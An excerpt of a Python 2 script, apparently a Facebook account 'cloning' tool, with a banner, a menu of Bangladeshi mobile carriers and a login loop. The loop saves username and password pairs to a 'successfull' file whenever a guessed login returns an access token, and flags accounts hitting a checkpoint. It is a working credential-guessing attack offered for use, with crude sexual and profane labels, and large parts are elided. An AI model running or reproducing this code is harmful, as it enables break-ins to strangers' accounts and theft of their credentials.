...
os.system('clear')
psb('\x1b[1;32m -- WEALCOME TO RAJU & ARIFAT SEX  CLONING START PLEASE WAIT ......')
...
logo = '\x1b[1;93m--------------------------------------------------\n \x1b[1;93m  ---> Author  -> MD MARUF  <--- \n\x1b[1;93m-------------------------------------------------- \n\x1b[1;93m     Facebook  -> MARUF  \n\x1b[1;93m--------------------------------------------------\n\x1b[1;93m  ---> Github -> noobmaruf <--- \n\x1b[1;93m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;92mAUTHOR  : MD MARUF '
    print '\x1b[1;92mFACEBOOK  : MARUF'
    print '\x1b[1;92mGITHUB  : https://github.com/noobmaruf'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  ROBI (JOY)'
    print '\x1b[1;92m[2]  AIRTEL(ARFAT)'
    print '\x1b[1;92m[3]  BANGLALINK(RAJU)'
    print '\x1b[1;92m[4]  BANGLALINK(Heda)'
    print '\x1b[1;92m[5]  GRAMEEN(PUSE)'
    print '\x1b[1;92m[6]  TELETALK( Sexy DEAR Magi)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[TORE Heda-ok]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[FUCK-DEAR-Cp]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
